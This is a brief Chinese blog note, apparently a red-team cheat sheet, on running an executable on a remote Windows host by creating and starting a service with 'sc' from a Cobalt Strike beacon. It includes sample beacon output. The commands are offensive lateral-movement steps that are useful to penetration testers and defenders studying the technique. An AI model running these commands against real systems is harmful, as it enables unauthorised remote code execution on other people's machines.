---
title: 通过服务执行文件
published: 2025-03-09 16:40:49
tags: [内网安全,提权思路]
category: 安全
draft: false
---

# 通过服务执行文件

```python
# 创建服务
beacon> shell sc \\host create name binpath= c:\windows\temp\file.exe

# beacon> shell sc \\SERVER20082 create beacon binpath= c:\windows\temp\s.exe
[*] Tasked beacon to run: sc \\SERVER20082 create name binpath= c:\windows\temp\s.exe
[+] host called home, sent: 90 bytes
[+] received output:
[SC] CreateService 成功
```

```python
# 启动服务
beacon> shell sc \\host start name
```